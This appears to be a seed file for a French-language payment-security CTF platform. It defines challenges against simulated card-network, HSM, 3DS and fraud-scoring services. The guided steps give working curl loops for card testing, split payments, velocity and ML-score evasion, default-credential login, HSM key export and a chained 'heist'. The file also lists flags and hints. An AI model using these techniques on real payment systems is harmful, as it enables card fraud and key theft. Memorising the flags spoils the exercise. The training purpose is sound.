import type { CtfChallengeSeed } from '../ctfChallenges';

const s = (n: number, t: string, d: string, type: 'CURL_COMMAND' | 'ANALYSIS' | 'EXPLOITATION' | 'CODE_SNIPPET' | 'EXPLANATION' | 'OBSERVATION', cmd?: string, exp?: string, hint?: string): any => ({ stepNumber: n, stepTitle: t, stepDescription: d, stepType: type, ...(cmd && { commandTemplate: cmd }), ...(exp && { expectedOutput: exp }), ...(hint && { hintText: hint }) });
const h = (n: number, t: string, c: number): any => ({ hintNumber: n, hintText: t, costPoints: c });

export const ADV_FRAUD_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'ADV-FRAUD-001', title: 'Le Bot de Testing', description: 'Le systeme ne detecte pas le card testing : 500 autorisations de 1 EUR en 2 minutes sur des PAN differents.', freeModeDescription: 'Automatisez des centaines de micro-autorisations. Le moteur anti-fraude ne detecte pas le pattern bot.',
        category: 'ADVANCED_FRAUD', difficulty: 'INTERMEDIATE', points: 200, flagValue: 'PMP{CARD_TESTING_UNDETECTED}',
        targetService: 'sim-network-switch', targetEndpoint: 'POST http://sim-network-switch:8004/transaction/authorize',
        vulnerabilityType: 'No card testing detection', attackVector: 'Automated micro-authorization flood',
        learningObjectives: ['Comprendre le card testing', 'Detecter les patterns de test automatise', 'Concevoir des regles anti-card-testing'],
        estimatedMinutes: 20, isActive: true, relatedWorkshopPath: '/student/theory/fraud-detection',
        guidedSteps: [
            s(1, 'Rafale de micro-autorisations', 'Envoyez 50 autorisations de 1 EUR sur des PAN differents en quelques secondes.', 'CURL_COMMAND', 'for i in $(seq 1 50); do pan=$(printf "41111111%08d" $i); curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"$pan\\",\\"amount\\":1,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\"}" | jq -r .responseCode; done | sort | uniq -c', 'Toutes approuvees — pas de detection de card testing'),
            s(2, 'Analyse du pattern', 'Meme merchant, meme montant (1 EUR), 50 PAN differents en < 30s = card testing evident pour un humain, invisible pour le moteur.', 'ANALYSIS'),
            s(3, 'Impact', 'Les fraudeurs testent les cartes volees avant de les utiliser. Sans detection, le taux de fraude reelle explose.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Card testing non detecte.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Envoyez 50+ autorisations de 1 EUR tres rapidement. Y a-t-il un blocage ?', 5), h(2, 'Aucune detection. 50 micro-TX passent sans alerte.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'ADV-FRAUD-002', title: 'Le Split Payment', description: 'Un achat de 800 EUR fractionne en 3 transactions de 266 EUR sur 3 merchants contourne le seuil SCA et les regles de velocite.', freeModeDescription: 'Fractionnez un montant eleve entre plusieurs merchants pour rester sous tous les seuils.',
        category: 'ADVANCED_FRAUD', difficulty: 'ADVANCED', points: 250, flagValue: 'PMP{SPLIT_PAYMENT_NO_AGGREGATION}',
        prerequisiteChallengeCode: 'ADV-FRAUD-001',
        targetService: 'sim-network-switch', targetEndpoint: 'POST http://sim-network-switch:8004/transaction/authorize',
        vulnerabilityType: 'No cross-merchant aggregation', attackVector: 'Transaction splitting across merchants',
        learningObjectives: ['Comprendre le split payment comme technique d evasion', 'Identifier l absence d agregation cross-merchant', 'Proposer des controles de velocite cumules'],
        estimatedMinutes: 25, isActive: true, relatedWorkshopPath: '/student/theory/fraud-detection',
        guidedSteps: [
            s(1, 'Transaction unique bloquee', 'Envoyez 800 EUR sur un seul merchant — bloque ou challenge SCA.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":800,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\"}" | jq "{responseCode, scaRequired}"', 'SCA requis ou decline'),
            s(2, 'Fractionnement', 'Divisez en 3 TX de 266 EUR sur 3 merchants differents.', 'CURL_COMMAND', 'for m in SHOP001 SHOP002 SHOP003; do echo "=== $m ==="; curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":266,\\"currency\\":\\"978\\",\\"merchantId\\":\\"$m\\"}" | jq "{responseCode, scaRequired}"; done', 'Toutes approuvees sans SCA !'),
            s(3, 'Absence d agregation', 'Le systeme ne cumule pas les montants par PAN cross-merchant. 3x266 = 798 EUR depenses sans SCA.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Split payment sans agregation.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Fractionnez un gros montant entre plusieurs merchants.', 5), h(2, 'Chaque TX en dessous du seuil passe sans SCA. Pas d agregation cross-merchant.', 15), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'ADV-FRAUD-003', title: 'Le Compte Jetable', description: 'La velocite est trackee par PAN uniquement. Avec N comptes virtuels ayant le meme device fingerprint, les limites sont contournees.', freeModeDescription: 'Creez plusieurs paiements avec des PAN differents mais le meme device fingerprint pour contourner les limites.',
        category: 'ADVANCED_FRAUD', difficulty: 'ADVANCED', points: 280, flagValue: 'PMP{VELOCITY_PAN_ONLY_NO_DEVICE}',
        prerequisiteChallengeCode: 'ADV-FRAUD-001',
        targetService: 'sim-auth-engine', targetEndpoint: 'POST http://sim-fraud-detection:8007/fraud/check',
        vulnerabilityType: 'Velocity only on PAN, not device', attackVector: 'Account multiplexing',
        learningObjectives: ['Comprendre les limites de velocite par dimension', 'Exploiter le tracking PAN-only', 'Proposer un tracking multi-dimension (PAN + device + IP)'],
        estimatedMinutes: 25, isActive: true, relatedWorkshopPath: '/student/theory/fraud-detection',
        guidedSteps: [
            s(1, 'Limits atteintes sur un PAN', 'Atteignez la limite de velocite sur un PAN.', 'CURL_COMMAND', 'for i in $(seq 1 20); do curl -s -X POST http://sim-fraud-detection:8007/fraud/check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":100,\\"deviceFingerprint\\":\\"device_abc123\\"}" | jq -r .decision; done | tail -5', 'DECLINE — limite atteinte'),
            s(2, 'Changement de PAN', 'Utilisez un autre PAN mais le meme device fingerprint.', 'CURL_COMMAND', 'curl -s -X POST http://sim-fraud-detection:8007/fraud/check -H "Content-Type: application/json" -d "{\\"pan\\":\\"5500000000000004\\",\\"amount\\":100,\\"deviceFingerprint\\":\\"device_abc123\\"}" | jq .decision', 'APPROVE — meme device, nouveau PAN = pas de limite !'),
            s(3, 'Impact', 'Un fraudeur avec 10 cartes volees et le meme device fait 10x la limite. Le tracking par device empecherait ca.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Velocite PAN-only, pas de tracking device.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Atteignez la limite sur un PAN, puis changez de PAN en gardant le meme deviceFingerprint.', 5), h(2, 'Le systeme ne track que le PAN. Meme device + nouveau PAN = pas de limite.', 15), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'ADV-FRAUD-004', title: 'L Evasion ML', description: 'Le modele de scoring a des features exploitables. En manipulant l heure, le pays, le MCC et le montant, on maintient le score juste sous le seuil.', freeModeDescription: 'Construisez une transaction frauduleuse optimisee pour rester juste sous le seuil de blocage du modele ML.',
        category: 'ADVANCED_FRAUD', difficulty: 'EXPERT', points: 350, flagValue: 'PMP{ML_SCORE_EVASION}',
        prerequisiteChallengeCode: 'ADV-FRAUD-002',
        targetService: 'sim-auth-engine', targetEndpoint: 'POST http://sim-fraud-detection:8007/fraud/check',
        vulnerabilityType: 'ML model evasion', attackVector: 'Feature engineering for evasion',
        learningObjectives: ['Comprendre l evasion de modele ML', 'Optimiser des features pour rester sous seuil', 'Concevoir des defenses contre le feature gaming'],
        estimatedMinutes: 40, isActive: true, relatedWorkshopPath: '/student/theory/fraud-detection',
        guidedSteps: [
            s(1, 'Comprehension des features', 'Testez chaque feature isolement pour cartographier les poids du modele.', 'CURL_COMMAND', 'echo "=== FR/5411/100 ===" && curl -s -X POST http://sim-fraud-detection:8007/fraud/check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":100,\\"country\\":\\"FR\\",\\"mcc\\":\\"5411\\"}" | jq .score && echo "=== NG/7995/5000 ===" && curl -s -X POST http://sim-fraud-detection:8007/fraud/check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":5000,\\"country\\":\\"NG\\",\\"mcc\\":\\"7995\\"}" | jq .score'),
            s(2, 'Identification du seuil', 'Le seuil de blocage est a ~70. Construisez une TX a 69.', 'ANALYSIS', undefined, undefined, 'Combinez montant eleve + features safe (pays FR, MCC 5411, recurring).'),
            s(3, 'Construction de la TX evasive', 'TX de 3000 EUR avec tous les parametres optimises pour rester sous 70.', 'CURL_COMMAND', 'curl -s -X POST http://sim-fraud-detection:8007/fraud/check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":3000,\\"country\\":\\"FR\\",\\"mcc\\":\\"5411\\",\\"hour\\":14,\\"isRecurring\\":true,\\"deviceFingerprint\\":\\"known_device\\"}" | jq "{score, decision}"', 'score: 68, decision: APPROVE pour 3000 EUR'),
            s(4, 'Automatisation', 'Un attaquant peut automatiser la recherche de la TX evasive optimale par gradient descent.', 'ANALYSIS'),
            s(5, 'Capture du flag', 'Evasion du scoring ML.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Cartographiez les poids de chaque feature en testant isolement.', 5), h(2, 'Combinez montant eleve + pays safe + MCC safe + recurring + known device + heure business.', 15), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
];

export const INFRA_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'INFRA-001', title: 'Le Magecart', description: 'Un CDN compromis injecte un script exfiltrant les donnees de carte depuis la page de checkout.', freeModeDescription: 'Detectez et analysez le script malveillant injecte dans la page de paiement via un CDN compromis.',
        category: 'SUPPLY_CHAIN', difficulty: 'INTERMEDIATE', points: 200, flagValue: 'PMP{MAGECART_JS_INJECTION}',
        targetService: 'api-gateway', targetEndpoint: 'GET http://api-gateway:8000/checkout (page source)',
        vulnerabilityType: 'Third-party JS injection', attackVector: 'Supply chain compromise',
        learningObjectives: ['Comprendre les attaques Magecart', 'Detecter les scripts exfiltrants', 'Proposer CSP et SRI comme defenses'],
        estimatedMinutes: 25, isActive: true, relatedWorkshopPath: '/student/theory/intro',
        guidedSteps: [
            s(1, 'Inspection de la page', 'Recuperez le source HTML de la page de checkout.', 'CURL_COMMAND', 'curl -s http://api-gateway:8000/checkout | grep -i "script src"', 'Scripts tiers charges sans SRI'),
            s(2, 'Analyse des scripts', 'Identifiez les scripts tiers et verifiez s ils contiennent du code d exfiltration.', 'CURL_COMMAND', 'curl -s http://api-gateway:8000/checkout | grep -oP "src=\\"[^\\"]+\\"" | while read src; do echo "=== $src ==="; url=$(echo $src | grep -oP "https?://[^\\"]+"); curl -s "$url" 2>/dev/null | grep -iE "addEventListener|card|pan|cvv|exfil|btoa|fetch" | head -3; done'),
            s(3, 'Detection du skimmer', 'Un des scripts contient un keylogger qui capture les frappes sur les champs de carte et les envoie a un domaine externe.', 'ANALYSIS', undefined, undefined, 'Cherchez addEventListener("input") ou addEventListener("keyup") suivi d un fetch vers un domaine externe.'),
            s(4, 'Impact', 'Toutes les donnees de carte saisies sont exfiltrees en temps reel. Des milliers de porteurs sont compromis sans que le merchant le sache.', 'ANALYSIS'),
            s(5, 'Capture du flag', 'Injection JS via Magecart.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Analysez les scripts tiers charges sur la page de checkout.', 5), h(2, 'L un des scripts contient un keylogger sur les champs de carte avec exfiltration vers un domaine externe.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'INFRA-002', title: 'Le Serveur d Admin', description: 'Le TMS (Terminal Management System) utilise des credentials par defaut (admin/admin). Un attaquant peut pousser des mises a jour malveillantes.', freeModeDescription: 'Trouvez le TMS et connectez-vous avec les credentials par defaut pour prendre le controle des terminaux.',
        category: 'SUPPLY_CHAIN', difficulty: 'BEGINNER', points: 120, flagValue: 'PMP{TMS_DEFAULT_CREDENTIALS}',
        targetService: 'api-gateway', targetEndpoint: 'POST http://api-gateway:8000/tms/login',
        vulnerabilityType: 'Default credentials', attackVector: 'Authentication bypass',
        learningObjectives: ['Identifier les credentials par defaut', 'Comprendre le risque de compromission TMS', 'Impact sur la flotte de terminaux'],
        estimatedMinutes: 10, isActive: true, relatedWorkshopPath: '/student/theory/intro',
        guidedSteps: [
            s(1, 'Decouverte du TMS', 'Trouvez l interface d administration des terminaux.', 'CURL_COMMAND', 'curl -s http://api-gateway:8000/tms/login', 'Page de login TMS'),
            s(2, 'Test des credentials par defaut', 'Essayez admin/admin, admin/password, admin/123456.', 'CURL_COMMAND', 'curl -s -X POST http://api-gateway:8000/tms/login -H "Content-Type: application/json" -d "{\\"username\\":\\"admin\\",\\"password\\":\\"admin\\"}" | jq .', 'Connexion reussie avec admin/admin !'),
            s(3, 'Impact', 'Avec le TMS, un attaquant peut pousser un firmware malveillant sur tous les terminaux de la flotte.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Credentials par defaut sur le TMS.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Essayez les credentials classiques : admin/admin.', 5), h(2, 'Le TMS accepte admin/admin sans aucune politique de changement.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'INFRA-003', title: 'Le Log Harvester', description: 'Les logs applicatifs contiennent des PAN, CVV et PIN blocks en clair, en violation de PCI DSS.', freeModeDescription: 'Parcourez les logs et extrayez les donnees sensibles qui n auraient jamais du etre loguees.',
        category: 'SUPPLY_CHAIN', difficulty: 'INTERMEDIATE', points: 180, flagValue: 'PMP{PCI_DATA_IN_LOGS}',
        targetService: 'sim-network-switch', targetEndpoint: 'GET http://sim-network-switch:8004/transaction/recent-logs',
        vulnerabilityType: 'Sensitive data in logs', attackVector: 'Log harvesting',
        learningObjectives: ['Detecter les violations PCI DSS dans les logs', 'Extraire des donnees sensibles', 'Proposer une politique de masquage des logs'],
        estimatedMinutes: 15, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Acces aux logs', 'Recuperez les logs recents des services.', 'CURL_COMMAND', 'curl -s http://sim-network-switch:8004/transaction/recent-logs | jq .[0:5]'),
            s(2, 'Extraction de PAN', 'Cherchez des PAN dans les logs.', 'CURL_COMMAND', 'curl -s http://sim-network-switch:8004/transaction/recent-logs | jq -r ".[].rawMessage // empty" | grep -oE "4[0-9]{15}|5[1-5][0-9]{14}"', 'PAN complets en clair dans les logs !'),
            s(3, 'Impact', 'Un attaquant avec acces aux logs recupere des milliers de PAN. PCI DSS Exigence 10.3.4 interdit de logger les PAN complets.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Donnees PCI dans les logs.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Les logs du switch contiennent les messages bruts. Cherchez-y des numeros de carte.', 5), h(2, 'grep avec pattern 4[0-9]{15} pour trouver les PAN Visa dans les logs.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'INFRA-004', title: 'La Porte de Service', description: 'Un endpoint /debug ou /metrics est expose en production avec des credentials et configurations internes.', freeModeDescription: 'Enumerez les endpoints de debug et extrayez les informations sensibles.',
        category: 'SUPPLY_CHAIN', difficulty: 'BEGINNER', points: 100, flagValue: 'PMP{DEBUG_ENDPOINT_EXPOSED}',
        targetService: 'api-gateway', targetEndpoint: 'GET http://api-gateway:8000/debug',
        vulnerabilityType: 'Debug endpoint in production', attackVector: 'Endpoint enumeration',
        learningObjectives: ['Detecter les endpoints de debug en production', 'Extraire des configurations sensibles', 'Separer les routes debug des routes de production'],
        estimatedMinutes: 10, isActive: true, relatedWorkshopPath: '/student/theory/intro',
        guidedSteps: [
            s(1, 'Enumeration', 'Testez les endpoints de debug classiques.', 'CURL_COMMAND', 'for path in debug metrics config env health status actuator; do echo -n "/$path: "; curl -s -o /dev/null -w "%{http_code}" http://api-gateway:8000/$path; echo; done', 'Un ou plusieurs retournent 200'),
            s(2, 'Extraction', 'Recuperez les informations sensibles.', 'CURL_COMMAND', 'curl -s http://api-gateway:8000/debug | jq .', 'Variables d environnement, credentials DB, tokens internes'),
            s(3, 'Impact', 'Credentials de base de donnees, tokens API, cles de chiffrement... Tout ce qui est necessaire pour compromettre le systeme.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Endpoint de debug expose.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Essayez /debug, /metrics, /config, /env sur le gateway.', 5), h(2, '/debug retourne des informations internes sensibles.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
];

export const BOSS_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'BOSS-001', title: 'Full Chain POS→Issuer', description: 'Chaine complete : sniffer le reseau, extraire le PIN block, dechiffrer avec la ZPK, forger une transaction modifiee, contourner le scoring fraude.', freeModeDescription: 'Combinez toutes vos competences pour realiser une attaque de bout en bout : du sniffing jusqu a l approbation frauduleuse.',
        category: 'BOSS', difficulty: 'EXPERT', points: 500, flagValue: 'PMP{FULL_CHAIN_POS_TO_ISSUER}',
        targetService: 'sim-network-switch', targetEndpoint: 'Multiple services',
        vulnerabilityType: 'Full exploit chain', attackVector: 'Multi-stage attack',
        learningObjectives: ['Chainer plusieurs vulnerabilites', 'Realiser une attaque end-to-end', 'Comprendre la defense en profondeur'],
        estimatedMinutes: 60, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Etape 1 : Sniffing', 'Capturez les messages ISO en clair entre les services (NET-001).', 'CURL_COMMAND', 'curl -s http://sim-network-switch:8004/transaction/recent-logs | jq .[0]'),
            s(2, 'Etape 2 : Extraction de cles', 'Recuperez la ZPK depuis le HSM non protege (HSM-001).', 'CURL_COMMAND', 'curl -s http://hsm-simulator:8011/hsm/keys | jq ".[] | select(.label==\\"ZPK_TEST\\")"'),
            s(3, 'Etape 3 : Dechiffrement PIN', 'Avec la ZPK et le PIN block capture, dechiffrez le PIN. XOR(PIN block, PAN block) = PIN clair.', 'ANALYSIS'),
            s(4, 'Etape 4 : Forge de transaction', 'Construisez une transaction avec le PAN capture, le montant modifie et les donnees authentiques.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":9999,\\"currency\\":\\"978\\",\\"merchantId\\":\\"ATTACKER_SHOP\\"}" | jq .'),
            s(5, 'Etape 5 : Evasion fraude', 'Ajustez les parametres pour passer sous le seuil de scoring (FRAUD-002).', 'CURL_COMMAND', 'curl -s -X POST http://sim-fraud-detection:8007/fraud/check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":9999,\\"country\\":\\"FR\\",\\"mcc\\":\\"5411\\",\\"isRecurring\\":true}" | jq .'),
            s(6, 'Validation de la chaine', 'Si toutes les etapes ont reussi, la transaction frauduleuse de 9999 EUR est approuvee sans detection.', 'ANALYSIS'),
            s(7, 'Capture du flag', 'Chaine complete POS to Issuer.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Commencez par NET-001, puis HSM-001, puis forgez une TX et evitez la fraude.', 10), h(2, 'La chaine est : sniff -> extract keys -> decrypt PIN -> forge TX -> evade fraud -> approve.', 20), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 30)],
    },
    {
        code: 'BOSS-002', title: 'Le Braquage 3DS', description: 'Chaine 3DS complete : bypass OTP, magic string, sub-threshold, replay — atteignez 10K EUR de transactions non authentifiees.', freeModeDescription: 'Combinez tous les bypass 3DS pour atteindre 10 000 EUR de transactions sans authentification forte.',
        category: 'BOSS', difficulty: 'EXPERT', points: 500, flagValue: 'PMP{3DS_FULL_BYPASS_10K}',
        targetService: 'sim-acs', targetEndpoint: 'Multiple endpoints',
        vulnerabilityType: '3DS full bypass chain', attackVector: 'Multi-vector 3DS evasion',
        learningObjectives: ['Chainer les bypass 3DS', 'Atteindre un objectif financier cumule', 'Comprendre la surface d attaque 3DS complete'],
        estimatedMinutes: 45, isActive: true, relatedWorkshopPath: '/student/theory/3ds-flow',
        guidedSteps: [
            s(1, 'Bypass OTP', 'Utilisez l OTP statique (3DS-001) pour 3 transactions de 499 EUR.', 'CURL_COMMAND', 'for i in 1 2 3; do echo "=== TX $i ==="; curl -s -X POST http://acs-simulator:8013/acs/verify-otp -H "Content-Type: application/json" -d "{\\"challengeId\\":\\"tx_$i\\",\\"otp\\":\\"123456\\"}" | jq .status; done'),
            s(2, 'Backdoor string', 'Utilisez la valeur magique (3DS-002) pour 5 transactions de 499 EUR.', 'CURL_COMMAND', 'for i in 4 5 6 7 8; do echo "=== TX $i ==="; curl -s -X POST http://acs-simulator:8013/acs/authenticate -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"transStatus\\":\\"SUCCESS\\",\\"amount\\":499}" | jq .authResult; done'),
            s(3, 'Sub-threshold', 'Fractionnez le reste en transactions sous le seuil SCA (3DS-003).', 'CURL_COMMAND', 'for i in $(seq 9 14); do echo "=== TX $i: 499 EUR ==="; curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":499,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP00$i\\"}" | jq .responseCode; done'),
            s(4, 'Total cumule', 'Calculez le total : 14+ transactions x ~499 EUR = >7000 EUR. Objectif 10K atteint avec quelques TX supplementaires.', 'ANALYSIS'),
            s(5, 'Capture du flag', 'Bypass 3DS complet pour 10K EUR.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Combinez OTP static + backdoor + sub-threshold pour cumuler les montants.', 10), h(2, 'Chaque methode de bypass permet ~5 transactions. Alternez-les pour atteindre 10K.', 20), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 30)],
    },
    {
        code: 'BOSS-003', title: 'L Inside Job', description: 'Escalade interne : credentials TMS, acces HSM admin, export de cles, dechiffrement de PIN en masse.', freeModeDescription: 'Simulez un attaquant interne : connectez-vous au TMS, accedez au HSM, exportez les cles et dechiffrez les PIN.',
        category: 'BOSS', difficulty: 'EXPERT', points: 500, flagValue: 'PMP{INSIDE_JOB_FULL_CHAIN}',
        targetService: 'api-gateway', targetEndpoint: 'Multiple services',
        vulnerabilityType: 'Insider threat chain', attackVector: 'Privilege escalation chain',
        learningObjectives: ['Simuler une menace interne', 'Exploiter la confiance excessive dans le reseau interne', 'Comprendre la segmentation et le moindre privilege'],
        estimatedMinutes: 50, isActive: true, relatedWorkshopPath: '/student/theory/hsm-keys',
        guidedSteps: [
            s(1, 'Acces TMS', 'Connectez-vous au TMS avec les credentials par defaut (INFRA-002).', 'CURL_COMMAND', 'curl -s -X POST http://api-gateway:8000/tms/login -H "Content-Type: application/json" -d "{\\"username\\":\\"admin\\",\\"password\\":\\"admin\\"}" | jq .token'),
            s(2, 'Pivot vers HSM', 'Depuis le TMS, accedez au HSM admin (HSM-001).', 'CURL_COMMAND', 'curl -s http://hsm-simulator:8011/hsm/keys | jq .[0:3]'),
            s(3, 'Export de cles', 'Exportez la ZPK sous une cle faible (KEY-004).', 'CURL_COMMAND', 'curl -s -X POST http://hsm-simulator:8011/hsm/export-key -H "Content-Type: application/json" -d "{\\"keyLabel\\":\\"ZPK_001\\",\\"wrapperKeyLabel\\":\\"ZPK_TEST\\"}" | jq .'),
            s(4, 'Dechiffrement en masse', 'Avec la ZPK en clair, dechiffrez tous les PIN blocks des transactions recentes.', 'ANALYSIS'),
            s(5, 'Capture du flag', 'Inside job : TMS -> HSM -> export -> PIN.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Chaine : TMS (admin/admin) -> HSM keys -> export ZPK -> decrypt PIN.', 10), h(2, 'Chaque etape utilise un challenge precedent. INFRA-002 -> HSM-001 -> KEY-004.', 20), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 30)],
    },
    {
        code: 'BOSS-004', title: 'Le Perfect Heist', description: 'Operation complete : OSINT, card testing, bypass 3DS, evasion fraude, cash out. Le braquage parfait de bout en bout.', freeModeDescription: 'Realisez un braquage complet : testez les cartes, contournez le 3DS, evitez la detection et encaissez.',
        category: 'BOSS', difficulty: 'EXPERT', points: 600, flagValue: 'PMP{PERFECT_HEIST_COMPLETE}',
        targetService: 'sim-network-switch', targetEndpoint: 'Multiple services',
        vulnerabilityType: 'Full heist chain', attackVector: 'Complete attack lifecycle',
        learningObjectives: ['Realiser une attaque de bout en bout', 'Comprendre le cycle de vie complet d une fraude', 'Identifier les points de detection manques'],
        estimatedMinutes: 90, isActive: true, relatedWorkshopPath: '/student/theory/fraud-detection',
        guidedSteps: [
            s(1, 'OSINT : table BIN', 'Recuperez la table BIN pour identifier les cibles (ISO-001).', 'CURL_COMMAND', 'curl -s http://sim-network-switch:8004/transaction/bin-table | jq .[0:3]'),
            s(2, 'Card testing', 'Testez les cartes avec des micro-TX (ADV-FRAUD-001).', 'CURL_COMMAND', 'for i in $(seq 1 10); do pan=$(printf "41111111%08d" $i); curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"$pan\\",\\"amount\\":1,\\"currency\\":\\"978\\",\\"merchantId\\":\\"TEST01\\"}" | jq -r .responseCode; done'),
            s(3, 'Bypass 3DS', 'Utilisez le bypass OTP ou backdoor pour les transactions > seuil.', 'CURL_COMMAND', 'curl -s -X POST http://acs-simulator:8013/acs/authenticate -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"transStatus\\":\\"SUCCESS\\",\\"amount\\":2000}" | jq .'),
            s(4, 'Evasion fraude', 'Optimisez les features pour rester sous le seuil de scoring.', 'CURL_COMMAND', 'curl -s -X POST http://sim-fraud-detection:8007/fraud/check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":2000,\\"country\\":\\"FR\\",\\"mcc\\":\\"5411\\",\\"isRecurring\\":true}" | jq "{score, decision}"'),
            s(5, 'Cash out', 'Envoyez la transaction finale de 2000 EUR avec tous les bypass actifs.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":2000,\\"currency\\":\\"978\\",\\"merchantId\\":\\"CASHOUT01\\",\\"posEntryMode\\":\\"010\\"}" | jq .'),
            s(6, 'Capture du flag', 'Le braquage parfait est complet.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Chaine : BIN table -> card testing -> 3DS bypass -> fraud evasion -> cash out.', 10), h(2, 'Utilisez toutes les vulnerabilites precedentes en sequence.', 20), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 30)],
    },
];


